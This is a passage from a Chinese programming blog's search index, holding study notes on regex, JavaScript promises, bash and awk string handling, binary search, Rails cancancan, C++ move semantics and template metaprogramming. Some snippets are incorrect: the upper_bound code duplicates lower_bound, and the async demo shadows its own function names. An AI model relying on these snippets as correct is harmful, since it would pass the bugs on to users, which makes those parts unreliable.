資料表關聯\n","categories":["Rails","FAQ"]},{"title":"進擊的regex","url":"/2020/12/advanced-regex/","content":"動機\n超越NFA的regex，酷!!\n\n從NFA開始\n.(任一字元): transition\n|: 分岔到兩個state\n*: loop 或是 直接跳到下一個state\n+: ..*\n&#123;n,&#125;: &lt;pat&gt;&lt;pat&gt;..(重複n-1次)&lt;pat&gt;+\n\\b: word boundry，可以把單字(字母與數字)從其他非單字字元的包圍中抽出來\nre.findall(r&#x27;\\b[0-9]+?\\b&#x27;,&quot;~123 456* 567&quot;)\n\\B: not word boundry，就是不是word boundry的字元\nre.findall(r&#x27;\\B[0-9]+\\B&#x27;,&quot;~123 456* 567&quot;)\n?: 除了是0或1的外，還有一個用法是不要比對到底(Laziness)，像.*原本會把所有字元都吃掉，但變成.*?後就不會試著全部match，而是只match可以過的部分，其他交給別的pattern\n從NFA到PDA\ngroup (ptr): 把比對到的東西放到regex engine的變數(stack)中 (&lt;pat&gt;)\nnamed group: group多了名字 (?P&lt;name&gt;&lt;pat&gt;)\nnon-capturing group: pattern不放到regex engine的變數(stack)中 (?:&lt;pat&gt;)\natomic group(Once-only Subexp­ression): 會cut的group (?&gt;&lt;pat&gt;)\n這個需要例子，像是a(?&gt;bc|b)c去比對abbcdabcc\n會先match到ab剩下的pattern是c剩下的string是dabcc，這會失敗，所以會retry\n但，因為atomic group會cut，他會把已經比對過的string都忘掉，所以接下去是從bcdabcc，\n最後match到abcc\nback reference: 透過變數使用之前比對到的東西來比對 \\n\nre.search(r&#x27;(hello) \\1 \\S+&#x27;, &#x27;This is a hello hello world!&#x27;)re.search(r&#x27;(\\&#x27;|\\&quot;).*\\1&#x27;,&quot;\\&quot;This is a \\&#x27;string\\&#x27;\\&quot;&quot;)\n從PDA到Turing Machine\nlookahead: 先往後(右)看如果match才繼續下去(如果是negtive，就是不match才繼續下去) (?=&lt;pat&gt;) (?!&lt;pat&gt;)\nlookbehind: 先往前(左)看如果match才繼續下去(如果是negtive，就是不match才繼續下去) (?&lt;=&lt;pat&gt;) (?&lt;!&lt;pat&gt;)\nre.search(r&#x27;(?&lt;=cda).*(?=c)&#x27;,&#x27;abbcdabcc&#x27;)re.search(r&#x27;(?=cda).*&#x27;,&#x27;abbcdabcc&#x27;)\nRecursion: 再複製一次pattern，再跑一次match，在Turing Machine可以當成把指針移到pattern的開頭 ?n OR ?R\nregex.search(r&quot;^(\\((?1)*\\))(?1)*$&quot;, &quot;()()&quot;)regex.search(r&quot;(\\w)((?R)|(\\w?))\\1&quot;, &quot;kayak&quot;)\n還有condition，但暫時搞不懂怎麼用，先放著\nRef\ngreat cheatsheet\nconcepts in advanced regex\nRecursive Regular Expression\n","categories":["Utils","Bash"]},{"title":"await 與 async 與 promise","url":"/2020/12/await-async-promise/","content":"動機\n想到就來寫一寫\npromise is monad\npromise是從callback hell來的，而每個callback都有接callback的變數，所以可以用之前寫過的方式來把它簡化\n最後拿到的就是promise\nawait is bind &amp; async is return\n在monad中 return 是 讓一個值變成monad\n而 bind 是從monad中取值，再包成monad\n對應到 Promise就是\n\nthen(() =&gt; &#123;&#125;): bind\nPromise.resolve(val): return\n\n但是寫Promise.resolve(val)配function有點長，所以有了async\n寫then((x) =&gt; &#123; return x&#125;)只是為了取個值也很煩，所以有了await\n從promise到await\n正常的code\nlet a = 1let b = 2let c = 3return a+b+c\n包成callback\n(a) =&gt; &#123;    return (a,b) =&gt; &#123;        return (a,b,c) =&gt; &#123;            return a+b+c        &#125;(1,2,3);    &#125;(1,2);&#125;(1);// OR(a) =&gt; &#123;    return (b) =&gt; &#123;        return (c) =&gt; &#123;            return a+b+c        &#125;(3);    &#125;(2);&#125;(1);\n用promise來寫，因為then之間的context不能共享，所以會變得很難看\nnew Promise(() =&gt; &#123; return 1 &#125;)    .then((a) =&gt; &#123; return [a,2]&#125;)    .then((a,b) =&gt; &#123; return [a,b,3] &#125;)    .then((a,b,c) =&gt; &#123; return a+b+c &#125;)//ORnew Promise(() =&gt; &#123; return 1 &#125;)    .then((a) =&gt; &#123; return new Promise(() =&gt; &#123; return 2&#125;)                            .then((b) =&gt; &#123; return new Promise(() =&gt; &#123;return 3&#125;)                                                    .then((c) =&gt; &#123; return a+b+c &#125;)&#125;)&#125;)\n用await來拆\nasync function a() &#123; return 1 &#125;async function b() &#123; return 2 &#125;async function c() &#123; return 3 &#125;async function demo() &#123;    let a = await a()    let b = await b() // 這裡可以當成then的參數列自動多了a,b，同時都會被帶對應的值    let c = await c()    return a+b+c&#125;","categories":["Javascript","FAQ"]},{"title":"bash的字串操作","url":"/2020/12/bash-str-operation/","content":"動機\n想把bash的某個字串轉成大寫，但因為bash太舊，所以不能用substitution來做，只能用awk\n所以來整理一下，在bash做字串處理的方式\n\nbash substitution\n\n大寫\n\n第一個字: $&#123;var^&#125;\n所有字: $&#123;var^^&lt;pat&gt;&#125;\n\n\n小寫\n\n第一個字: $&#123;var,&#125;\n所有字: $&#123;var,,&lt;pat&gt;&#125;\n\n\n找符合的所有變數名: $&#123;!VAR*&#125; &lt;= VAR1=1; VAR2=2; \nsubstring: $&#123;VAR:pos(included):len&#125;\nreplace\n\nonce: $&#123;VAR/pat1/pat2&#125;\nall: $&#123;VAR//pat1/pat2&#125;\n\n\nremove\n\nfront\n\nlazy: $&#123;VAR#PAT&#125;\neagal: $&#123;VAR##PAT&#125;\n\n\nback\n\nlazy: $&#123;VAR%PAT&#125;\neagal: $&#123;VAR%%PAT&#125;\n\n\n\n\nstrlen: ${#VAR}\ndefault val\n\nset: $&#123;VAR:=val&#125; &lt;= echo $VAR # val\nget: $&#123;VAR:-val&#125; &lt;= echo $VAR # &lt;empty&gt;\n\n\n\ncut\nstring -&gt; [string]\n像是someletters_12345_moreleters.ext只取12345\n可以用cut去切，用_去分[someletters, 12345, moreleters.ext]\n之後拿第2欄，cut -d '_' -f 2\nawk\nC的語法，py2的感覺，只有hash沒有array\nawk是針對文字檔案的工具，基本上\nBEGIN &#123;&#125;PAT1 &#123;&#125;PAT2 &#123;&#125;# ....END &#123;&#125;\n讀第一行時會先跑BEGIN，可以初始化變數，等最後一行跑完就會跑END\n之後就是一行一行看，如果對到pattern就跑那個block\n注意，awk的string只有double quote，沒有single quote\nfunction string_functions(localvar, arr) &#123;    localvar = &quot;fooooobar&quot;;    sub(&quot;fo+&quot;, &quot;Meet me at the &quot;, localvar); # localvar =&gt; &quot;Meet me at the bar&quot;    gsub(&quot;e+&quot;, &quot;.&quot;, localvar); # localvar =&gt; &quot;m..t m. at th. bar&quot;    # Search for a string that matches a regular expression    # index() does the same thing, but doesn&#x27;t allow a regular expression    match(localvar, &quot;t&quot;); # =&gt; 4, since the &#x27;t&#x27; is the fourth character    sprintf(&quot;%s %d %d %d&quot;, &quot;Testing&quot;, 1, 2, 3); # =&gt; &quot;Testing 1 2 3&quot;    substr(&quot;foobar&quot;, 2, 3); # =&gt; &quot;oob&quot;    substr(&quot;foobar&quot;, 4); # =&gt; &quot;bar&quot;    length(&quot;foo&quot;); # =&gt; 3    tolower(&quot;FOO&quot;); # =&gt; &quot;foo&quot;    toupper(&quot;foo&quot;); # =&gt; &quot;FOO&quot;&#125;# /^fo+bar$/# a &gt; 0 (boolean exp)$0 ~ /^fo+bar$/ &#123;  # Inside here, we have access to a number of useful variables, already  # pre-loaded for us:  # $0 is the entire line  # $3 is the third field, the age, which is what we&#x27;re interested in here  # NF is the number of fields, which should be 3  # NR is the number of records (lines) seen so far  # FILENAME is the name of the file being processed  # FS is the field separator being used, which is &quot; &quot; here  # $NF =&gt; $3  multidim[0,0] = &quot;foo&quot;;  assoc[&quot;foo&quot;] = &quot;bar&quot;;  n = split(&quot;foo:bar:baz&quot;, arr, &quot;:&quot;); /* arr = [&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;] */  if (&quot;foo&quot; in assoc)        print &quot;Fooey!&quot;;  for (key in assoc)      print assoc[key];    delete arr[1];  string_functions(assoc, multidim);&#125;\n用someletters_12345_moreleters.ext只取12345當例子\nawk 'BEGIN&#123;FS=&quot;_&quot;&#125; &#123;print $2&#125;'\nRef\nHow To Use Bash Parameter Substitution Like A Pro\nawk in x minutes\n","categories":["Utils","Bash"]},{"title":"binary-search最佳實踐","url":"/2020/12/binary-search-best-practice/","content":"動機\n整理一下\n\n1. [first, last)\n左右 * 閉開 =&gt; 4種\n假設長度為4的array，範圍如下\n\n0 &lt;= x &lt; 4\n0 &lt;= x &lt;= 3\n-1 &lt; x &lt;= 3\n-1 &lt; x &lt; 4\n\n如果bsearch到最後，左右兩邊重合\n\n0 &lt;= x &lt; 0\n0 &lt;= x &lt;= -1\n-1 &lt; x &lt;= -1\n-1 &lt; x &lt; 0\n\n所以我們還是選第一種左閉右開\n因此，終止條件是\nwhile i &lt; j:    pass\n2. mid = first + (last - first) // 2\n原本算中點是(last + first)//2，但是有可能會加到溢位!!\n改成用起點再加上多的部分\n記得，中點就是往開去算，故如果變成右閉左開要用\nlast - (last-first)//2去算\n另外注意，這裡是無條件捨去，另外有無條件進位的中點算法，但我還不知道使用上要怎麼選擇，但有遇過因此被婊的時候\n3. first = mid + 1, last = mid\n參考文中是用歸納法(那個loop invariant與我印象中的loop invariant不一樣，所以先叫他歸納法)去證為什麼是first = mid + 1, last = mid\n但這裡用終止條件的來看，為什麼是first = mid + 1, last = mid\n我們的終止條件左閉右開，所以之後的first與last都要左閉右開\n因為mid看過了不用保留所以first = mid + 1，那last呢?\n右邊是開，所以last = mid\n等到了搜尋完成，最後的結果會是last == first，所以在最後last的值會連同first被保留，十分有趣。\n總結\n再一次，去看參考的文章，必看阿!!!\ndef lower_bound(array, first, last, value):  # 求非降序范围[first, last)内第一个不小于value的值的位置  while first &lt; last: # 搜索区间[first, last)不为空    mid = first + (last - first) // 2 # 防溢出    if array[mid] &lt; value:      first = mid + 1    else:      last = mid  return first # last也行，因为[first, last)为空的时候它们重合\nRef\n炒讚，快去看\n","categories":["Algorithm","Tips"]},{"title":"二分搜尋與two pointer","url":"/2020/12/bsearch-and-two-ptr/","content":"動機\nAlgorithm, Leetcode 101有提到binary search 可以當成 two pointer 的特別case，就來看看到底哪裡相關\n\n丟掉哪些?\ntwo pointer一次都只移動一格，一次只丟掉一個\nbinary search是一次移動一半，一次丟掉一半\ntwo pointer\n3sum\n每做完一次2sum就丟掉一個最小的\ndef sum2(arr,target):  i = 0  j = len(arr)-1  while i&lt;j:    if arr[i]+arr[j] == target:      return True    elif arr[i]+arr[j] &gt; target:      j -= 1    else:      i += 1  return Falsedef sum3(arr,target):  for i in range(len(arr)):    if sum2(arr[i:],target-arr[i]):      return True  return False\nbinary search\n一次丟一半\n最大值最小化\n注意，這裡的有序是廣義的有序，如果一個數組中的左側或者右側都滿足某一種條件，而另一側都不滿足這種條件，也可以看作是一種有序。\n換言之，二分搜索法可以用來查找滿足某種條件的最大（最小）的值。 (lowerbound)\n\n答案在一個固定區間內；\n可能查找一個符合條件的值不是很容易，但是要求能比較容易地判斷某個值是否是符合條件的；\n可行解對於區間滿足一定的單調性。換言之，如果x是符合條件的，那麼有x+1或者x-1也符合條件。\n\n（這樣下來就滿足了上面提到的單調性）\n\n\n\n二分搜一個是找有沒有目標值，另一個是猜答案\n通常會有一個函數去check答案是比目標大還是小，之後就是對答案的range做二分搜\nbasic\narr = [1,2,3]i = 0j = len(arr)while i &lt; j:  mid = i+(j-i)//2  if arr[mid] == target:    return mid  elif arr[mid] &gt; target:    j = mid  else:    i = mid+1return False\n雖然說一般常看到的bsearch都是只比中點，一般來說這樣也夠了，但其實應該這樣寫，才能比較靈活運用bsearch\narr = [1,2,3]i = 0j = len(arr)while i &lt; j:  mid = i+(j-i)//2  if arr[mid] == target:    return mid  elif arr[mid] &lt; target &lt;= arr[j-1]: # 在這個範圍才進去    j = mid  else:    i = mid+1return False\nlower bound\nlower_bound: 第一個 大於等於(不小於) target的位置\narr = [1,2,3]i = 0j = len(arr)while i &lt; j:  mid = i+(j-i)//2  if arr[mid] &lt; target:    i = mid+1  else:    j = midreturn False\nupper bound\nupper_bound: 第一個 大於 target的位置\narr = [1,2,3]i = 0j = len(arr)while i &lt; j:  mid = i+(j-i)//2  if arr[mid] &lt; target:    i = mid+1  else:    j = midreturn False\n三分法\n三分法可以用来查找凸函數的最大（小）值。\nleft ... lmid ... rmid ... right\n如果lmid &lt;= rmid，這樣極值一定不在lmid的左手邊(left ~ lmid)\n如果lmid &gt; rmid，這樣極值一定不在rmid的右手邊(rmid ~ right)\nlmid = left + (right - left &gt;&gt; 1)rmid = lmid + (right - lmid &gt;&gt; 1)  # 對右側區間取半if (cal(lmid) &gt; cal(rmid))  right = rmidelse  left = lmid\n丟一半與丟一個: leetcode 154\narray被rotate過，不過只要是有排序的range就可以放心地用binary search\n因此第一件事是判斷現在是不是在有排序的range中，如果不是就只丟一個最左的\n剩下就是binary search與遞迴會處理\ndef f(ns,l,r):    if abs(l-r) &lt;= 1:        return min(ns[l],ns[r])    else:        mid = (l+r)//2        if ns[l] &lt; ns[mid]:            if ns[mid] &gt; ns[r]:                return f(ns,mid+1,r)            else:                return f(ns,l,mid-1)        elif ns[mid] &lt; ns[r]:            if ns[mid-1] &lt; ns[r]:                return f(ns,l,mid-1)            else:                return f(ns,mid,r)        elif ns[l] == ns[mid]:            return f(ns,l+1,r)        else:            return f(ns,l,r-1)class Solution:    def findMin(self, ns: List[int]) -&gt; int:        return f(ns,0,len(ns)-1)\nleetcode 153\narray被rotate過，但沒有重複，所以都是有排序的range，只要找出能用binary search就用，剩下遞迴\ndef f(ns,l,r):    if abs(l-r) &lt;= 1:        return min(ns[l],ns[r])    else:        mid = (l+r)//2        if ns[l] &lt; ns[mid]:            if ns[mid] &gt; ns[r]:                return f(ns,mid+1,r)            else:                return f(ns,l,mid-1)        else:            if ns[mid-1] &lt; ns[r]:                return f(ns,l,mid-1)            else:                return f(ns,mid,r)class Solution:    def findMin(self, ns: List[int]) -&gt; int:        return f(ns,0,len(ns)-1)\n判圈演算法\ndef floyd(node):  i = node  j = node  while i and j and j.next and i is not j:    i = next(i)    j = next(next(j))  return i is j and j is not node\n假設到loop前的長度是a，loop長為b\ni走了a+x*b+t，j走了a+y*b+t\n其中j走的距離是i的兩倍，兩者相減，i == (y-x)*b\ni是圈數的倍數，換言之，現在的i不管從哪邊走都是起點\n所以，把其中一個放回起點，兩方開始一步一步走，相遇點就是起點\n有起點找長度就簡單了，就是讓其中一方走到相遇就好\nP.S.: linked list 的中點\n這裡是利用1個走一倍1個走兩倍的特性，開始走得快的先到底，那麼走得慢的一定在中點\ndef mid(root):  i = root  j = root  while j and j.next:    i = next(i)    j = next(next(j))  return i\n","categories":["Algorithm","Classic"]},{"title":"cancancan的load_and_authorize_resource用法整理","url":"/2020/12/cancancan-load-and-authorize-resource/","content":"動機\n用load_and_authorize_resource去load變數時遇到的坑\n\ncancancan怎麼認權限?\n在ability.rb會有一個類似hash table的東西，之後會把user與authorize的參數丟進去比對。\n所以不一定是要是model只要是能分辯的東西就好。\ncancancan最難用的地方是?\n怎麼用他的方式load與authorize，因為這樣可以少寫很多authorize\n花式load資源時用到的options\nparent\n這個resource是parent嗎?\n如果cancancan去load某個resource卻失敗，就會當成是parent的attribute去load，像\nclass BooksController &lt; ApplicationController  load_resource :author # 這個會被當成parent，因為 author與controller(book)對不起來  load_resource :book, :through =&gt; :authorend\n但如果只是想load其他model來做事就要把這個設成false\nclass ReadersController &lt; ApplicationController  load_and_authorize_resource :copy, id_param: :copy_id, parent: falseend\nid_param就是id在params的欄位，另外也有find_by就是會變成find_by_&lt;given name&gt;(params[:&lt;the_id_name])\nthrough\n直翻就是透過某個object或是method去拿到parent再透過第一個parameter去load，像\nload_and_authorize_resource :role, singleton: true, through: :current_user, instance_name: :reader # current_user是devise的current_user\n等等，第一個parameter?\n第一個parameter到底是要什麼東西\n第一個parameter其實包含兩個東西\n\nparent的哪個attribute(預設是複數)\n最後@&lt;var name&gt;的名字是\n\n一般來說這兩個都是一樣的，像@books來自author.books，如果是code，大概像\neval &quot;@#&#123;getVarName()&#125; = parent.#&#123;getAttrName()&#125;&quot;\n但事情沒有這麼簡單，如果要的是attirubte與class對不起來(像我是要load多型的資料)，變數名字想換等等\n所以需要\n\nsingleton : 要的是單數attribute\ninstance_name : 變數名字\n\n沒有model但也想authorize\n就是沒有class的意思，所以把class設成false\nauthorize_resource :signup, class: false\n在ability中，寫成\ncan :manage, :signup #不是class，是symbol\nRef\n官方文件\n","categories":["Rails","Tips"]},{"title":"cpp的std::move","url":"/2020/12/cpp-move/","content":"動機\n寫寫std::move的筆記\n\nvalue type &amp; reference type\n\nvalue type: 每個變數持有的都是獨立的資料\nreference type: 每個變數持有的都是地址\n\n所以如果使用者想感受到value type就要看到，\n\n對變數修改時其他變數看的到\n\npointer in C &amp; reference in CPP\ncpp 預設的傳值是pass-by-value，所以會copy的是資料，而(Java, Python…)大部分的PL傳的都是reference\n就因為cpp的這件事，變成他與c一樣都要把指標丟來丟去，而cpp不想寫星號(悲劇的開始)，所以加了pass-by-reference\n回到c來看，會有指標的是變數(已經被賦值的)，只能從變數取指標(如果要直接指定記憶體位置，c是做得到啦，但這邊不談這個)\n但如果是像\nint *a = 1+2;int &amp;b = 1+2;\n就會出事，因為資料沒有被變數接住，就不能被指定到指標與參考，這十分不方便\n例子\nint add(int &amp;a, int &amp;b)  return a+b;&#125;add(1+2,1+2);\n遇到這種，就要先把資料assign到變數後才能用\nstd::move\n所以cpp這次怎麼曲線救國?\n再多一個傳值的選項，說\n\n我之後就用不到了，可以把我搬空(rvalue, xvalue)\n?\n而std::move就是把一個變數轉成說可以搬空我這樣\n\n整體std::move大概像\nstatic_cast&lt;typename std::remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t)\n搬空?\n見下面的例子\nclass string &#123;    char* datapublic:  string (const char* p) &#123;    size_t size = std::strlen(p) + 1;    data = new char[size];    std::memcpy(data, p, size);  &#125;  string (string&amp;&amp; rhs) &#123;    data = rhs.data;    rhs.data = nullptr; // 搬空  &#125;  ~string() &#123;      delete[] data;  &#125;&#125;;\n頭好昏，在c好好的，怎麼到cpp就變這麼複雜了\n\n(想要) cpp想讓複製物件，變成如同複製指標一樣 (躲掉多的deep copy，但是又不想多一個變數去接)\n(但是) cpp的語法讓複製資料與複製指標看起來一樣\n(所以) 要多一個語法以及傳值作法，處理看起來一樣的傳值\n(結果) 我們多了 &amp;&amp; 與 move\n\n因為cpp的語法讓複製資料與複製指標看起來一樣，但卻又在使用上把指標與資料區分開來\n在其他語言不論物件或是整數的賦值都是起來一樣，但是cpp遇到reference會把一般資料的賦值混在一起，\n就變成要再多一個case處理原本的複製資料，最後得到的就是現在的這些東西，還有更複雜的value category\nRef\nJava 有值类型吗？\nWhat is std::move(), and when should it be used?\n","categories":["C++","FAQ"]},{"title":"C++ template meta-programming筆記","url":"/2020/12/cpp-tmp/","content":"動機\n一切的開始，只是想要個reversed而已，就順便把tmp補完\n\ntips when using template\n別用float\n因為浮點數的結果不一致\nfunc&lt;1/3.f&gt; (); func&lt;2/6.f&gt; ();\nheader\n原本函數的宣告與實作會分成header與source code，但是template的code不能放在source code中。\n因為compiler要先看有template的code，之後才能填充type，在生出真正的code，專業一點叫 實體化(instantiation)\nsome tools\n\nconstexpr\n\nconst int SOME_INT_WILL_NOT_BE_MODIFIED = some_func();constexpr int INT_IS_COMPUTED_IN_COMPILCATION = 1 + 5;// #define MACRO_INT 1 + 5// 這只是會展開成 1+5但不會算成6，但constexpr會，同時template可以拿到他constexpr int foo(int i)&#123;    return i + 5;&#125;int main()&#123;    int i = 10;    std::array&lt;int, foo(5)&gt; arr; // OK    // as if 5 + 5, and computed in complication        foo(i); // Call is Ok    // This is usual function        // But...    std::array&lt;int, foo(i)&gt; arr1; // Error    // Compiler cant know what the value is foo(i), cuz i is determinated in run-time   &#125;\n\nusing\n\ntypedef int A;// &lt;=&gt;int typedef A;// &lt;=&gt;using A = int;\n\ndecltype\n\nstruct A &#123; double x; &#125;;const A* a; decltype(a-&gt;x) y;       // type of y is double (declared type)decltype((a-&gt;x)) z = y; // type of z is const double&amp; (lvalue expression)\n\n\ntypename\n把typename後面的東西當成type來看\n\n\nfunction only with types\n只要type對了就好\n\n\nvoid f(int,char[0]) &#123;   std::cout &lt;&lt; &quot;only types\\n&quot;;&#125;char wtf[0];f(10,NULL), f(123,wtf);\n\nTemplate specialization\ntemplate的參數先填掉\n\ntemplate&lt;int n&gt;struct fact &#123;        enum &#123; val = n*fact&lt;n-1&gt;::val &#125;;&#125;;template&lt;&gt;struct fact&lt;0&gt; &#123;         enum &#123; val = 1 &#125;;&#125;;\n\n0是誰?\n0可以當成\n\n\n整數\nnull ptr\nbool的false\n\n\ncompiler自己推type\n\ntemplate&lt;typename T&gt;T id(T x) &#123; return x; &#125;int main(int argc, char *argv[]) &#123;    std::cout &lt;&lt; id(123) &lt;&lt; &#x27;,&#x27; &lt;&lt; id(&quot;123&quot;) &lt;&lt; &#x27;\\n&#x27;;&#125;\nbasic (很像functional programming)\nfact\ntemplate&lt;int n&gt;struct fact &#123;        enum &#123; val = n*fact&lt;n-1&gt;::val &#125;;&#125;;template&lt;&gt;struct fact&lt;0&gt; &#123;        enum &#123; val = 1 &#125;;&#125;;int main() &#123;        //cout &lt;&lt; Min&lt;int, 1,2,3,4&gt;::val &lt;&lt; endl; //下面的        cout &lt;&lt; fact&lt;10&gt;::val &lt;&lt; endl;&#125;\nMin\n目標: Min&lt;int, 1,2,3,4&gt;::val拿到1\n\n宣告\n\ntemplate&lt;typename T, T ...&gt; // T...是type，像是va_liststruct Min;\n\ncase1: 如果有不只一個數字\n\ntemplate&lt;typename T, T v,T ... args&gt; // typename就是說這是一個typestruct Min&lt;T,v,args&gt; &#123; // 要填&lt;...&gt;符合原本的宣告 // destruct pack        //constexpr static auto val = min(v, hi&lt;T, args...&gt;::val);        enum &#123; val = (v &lt; (Min&lt;T, args...&gt;::val) ? v : (Min&lt;T, args...&gt;::val) &#125;;        // Min&lt;T, args...&gt;::val 就是遞迴剩下的部分\n\ncase2: 如果只有一個數字\n\ntemplate&lt;typename T, T v&gt;struct Min&lt;T,v&gt; &#123; enum &#123; val = v &#125;; &#125;;\nturing-complete\ntemplate是turing-complete，可以用template來實做lambda calculus\n也不意外，template的參數帶入就是lambda calculus的beta reduction\n詳細的說明blog\ncode\nSolution to Exercise\ntemplate &lt;typename A, typename B&gt;struct add &#123;&#125;;template &lt;typename A_s, typename B&gt;struct add&lt;Succ&lt;A_s&gt;, B&gt; &#123;  enum &#123; value = 1+add&lt;A_s,B&gt;::value &#125;;&#125;;template &lt;typename B&gt;struct add&lt;Zero, B&gt; &#123;  enum &#123; value = B::value &#125;;&#125;;\ntemplate &lt;typename lhs, typename rhs&gt;struct Add &#123;&#125;;template &lt;typename Lhs, typename Rhs, typename Env&gt;struct Eval&lt;Add&lt;Lhs, Rhs&gt; , Env&gt; &#123;  typename Apply&lt;Add&lt;typename Eval&lt;Lhs,Env&gt; :: result ,                    typename Eval&lt;Rhs,Env&gt; :: result &gt;, Zero&gt; :: result            typedef result ;&#125; ;template &lt;typename N, typename M&gt;struct Apply&lt;Add&lt;N, M&gt;, Zero&gt; &#123;  add&lt;N,M&gt; typedef result ;&#125; ;\ntrait\n可以理解成type的interface，描述這個type會在編譯期這個type有什麼屬性\n那怎麼描述(寫下)有這些屬性?\n\n寫到定義中 (這比較像type屬性的getter)\n\ntemplate &lt;typename Iterator&gt;struct iterator_traits &#123;    using value_type = typename Iterator::value_type;    using pointer = typename Iterator::pointer;    using const_pointer = typename Iterator::const_pointer;    using reference = typename Iterator::reference;    using const_reference = typename Iterator::const_reference;    using rvalue_reference = typename Iterator::rvalue_reference;    using iterator_category = typename Iterator::iterator_category;&#125;;template &lt;typename T&gt;class vector_iterator &#123;public:    using value_type = T;    using pointer = T *;    using const_pointer = const T *;    using reference = T &amp;;    using const_reference = const T &amp;;    using rvalue_reference = T &amp;&amp;;    using iterator_category = std::random_access_iterator_tag;    //...&#125;;\n\n特化 (這比較像描述一個type)\n\ntemplate &lt;typename Iterator&gt;struct iterator_traits &#123;&#125;;template &lt;typename T&gt;struct iterator_traits&lt;vector_iterator&lt;T&gt;&gt; &#123;    using value_type = T;    using pointer = T*;    using const_pointer = const T *;    using reference = T &amp;;    using const_reference = const T &amp;;    using rvalue_reference = const T &amp;;    using iterator_category = std::random_access_iterator_tag;&#125;;\nSFINAE\n就是compiler怎麼淘汰候選人的過程\n整個過程是有同樣名字的struct或是function都選出來，分別一個一個帶入，保留沒出事的，最後只剩下一個就用他\n最頭痛的是有同樣名字的struct或是function都選出來，分別一個一個帶入\n這樣子變成要確保沒每個template涵蓋到的部分不能與其他的宣告重疊，故個寫起來的感覺是\nif n == 1:        return &#x27;hi&#x27;if n != 1:        return &#x27;wow&#x27; \n不能像\nif n == 1:        return &#x27;hi&#x27;else:        return &#x27;wow&#x27;\n簡而言之，\n我們沒有failover的宣告，每個都要描寫出來，n為一，n不為一，\n不能是 n為一，其他\n要怎麼讓compiler淘汰候選人?\n在\n\ntemplate列表 (template那一行)\n特殊化列表 (function或是struct旁邊的角括號)\n參數列表 (function的參數列表)\n\n搞出奇怪的東西，像存取不存在的屬性、長度為零的array等等\n詳細的case見這裡\n還有可以看看type_traits.hpp怎麼實作那些神奇的traits\n用enable_if試試看\nenable_if會吃一個條件式，如果true吐一個type，如果false就會整個壞掉\n下面用enable_if來寫一個判斷int的函數\nf_if_integral_weak\nf_if_integral_weak沒辦法推出參數在此的type，故報錯\n如果要過，就要自己補type\n#include &lt;iostream&gt;#include &lt;type_traits&gt;template &lt;bool, typename&gt;struct enable_if;template &lt;typename T&gt;struct enable_if&lt;true, T&gt; &#123;        using type = T;&#125;;template &lt;typename T&gt;struct is_int &#123;        constexpr static inline auto value &#123;false&#125;;&#125;;template &lt;&gt;struct is_int&lt;int&gt; &#123;        constexpr static inline auto value &#123;true&#125;;&#125;;template &lt;typename T&gt;void f_if_integral_weak(typename enable_if&lt;is_int&lt;T&gt;::value, T&gt;::type) &#123;        std::cout &lt;&lt; &quot;a: is int\\n&quot;;&#125;int main(int argc, char *argv[]) &#123;        f_if_integral_weak&lt;int&gt;(10);        //f_if_integral_weak(0); // 0是誰?        //f_if_integral_weak(0.0); // 沒有type        f_if_integral_weak&lt;int&gt;(0);&#125;\nf_if_integral_strong\n手動打type在此蠻沒意義的，所以試著讓compiler自己推，原本的enable_if用預設參數補\n#include &lt;iostream&gt;#include &lt;type_traits&gt;template &lt;bool, typename&gt;struct enable_if;template &lt;typename T&gt;struct enable_if&lt;true, T&gt; &#123;        using type = T;&#125;;template &lt;typename T&gt;struct is_int &#123;        constexpr static inline auto value &#123;false&#125;;&#125;;template &lt;&gt;struct is_int&lt;int&gt; &#123;        constexpr static inline auto value &#123;true&#125;;&#125;;template &lt;typename T&gt;void f_if_integral_strong(T, typename enable_if&lt;is_int&lt;T&gt;::value, T&gt;::type* = 0) &#123;        std::cout &lt;&lt; &quot;b: is int\\n&quot;;&#125;int main(int argc, char *argv[]) &#123;        f_if_integral_strong(0);        //f_if_integral_strong(0.0); // 沒有type阿&#125;\nf_if_integral_stronger\n為什麼不用typename enable_if&lt;!is_int&lt;T&gt;::value, T&gt;::type來加不是int的case?\n因為typename enable_if&lt;!is_int&lt;T&gt;::value, T&gt;::type與typename enable_if&lt;is_int&lt;T&gt;::value, T&gt;::type最後推出來的type是一樣的\n這樣compiler分不出來!!\n但可以把另一個case放到別的地方，來區分兩個case\n#include &lt;iostream&gt;#include &lt;type_traits&gt;template &lt;bool, typename&gt;struct enable_if;template &lt;typename T&gt;struct enable_if&lt;true, T&gt; &#123;        using type = T;&#125;;template &lt;typename T&gt;struct is_int &#123;        constexpr static inline auto value &#123;false&#125;;&#125;;template &lt;&gt;struct is_int&lt;int&gt; &#123;        constexpr static inline auto value &#123;true&#125;;&#125;;template &lt;typename T, typename = typename enable_if&lt;is_int&lt;T&gt;::value, T*&gt;::type&gt;void f_if_integral_stronger(T) &#123;        std::cout &lt;&lt; &quot;c: is int\\n&quot;;&#125;template &lt;typename T&gt;void f_if_integral_stronger(T, typename enable_if&lt;!is_int&lt;T&gt;::value, T&gt;::type* = 0) &#123;        std::cout &lt;&lt; &quot;c: not int\\n&quot;;&#125;int main(int argc, char *argv[]) &#123;        f_if_integral_stronger(0.0);        f_if_integral_stronger(0);&#125;\n其實可以簡單一點\n用特別化就好\ntemplate &lt;typename T&gt;void f(T) &#123; std::cout &lt;&lt; &quot;not int\\n&quot;; &#125;template &lt;&gt;void f&lt;int&gt;(int) &#123; std::cout &lt;&lt; &quot;is int\\n&quot;; &#125;int main(int argc, char *argv[]) &#123;    f(1);    f(1.1);    f(&quot;1234&quot;);&#125;\nand_in_template\n這裡模擬&amp;&amp;，但要怎麼判斷true與false?\n有沒有壞掉!!\n#include &lt;iostream&gt;#include &lt;type_traits&gt;template &lt;typename ...&gt;struct and_in_template &#123;        using type = void;&#125;;template &lt;typename S&gt;void has_A_B(S,typename and_in_template&lt;typename S::A, typename S::B&gt;::type* = 0) &#123;        std::cout &lt;&lt; &quot;get it\\n&quot;;&#125;struct Ans &#123;        struct A&#123;&#125;;        struct B&#123;&#125;;&#125;;int main(int argc, char *argv[]) &#123;        Ans a;        has_A_B(a);&#125;\nconcept\nC++20的東西，可以對type的要求寫下來成為concept\n之後就可以用require搭配其他concept一起用，\n\nConjunction (AND)\nDisjunction (OR)\n\n有一個名詞是Atomic constraint，其實就是會回傳bool的type_trait，只是原本type_trait要自己訂欄位放結果，但concept可以直接return\ntemplate&lt;typename T&gt;struct S &#123;    constexpr operator bool() const &#123; return true; &#125;&#125;; template&lt;typename T&gt;    requires 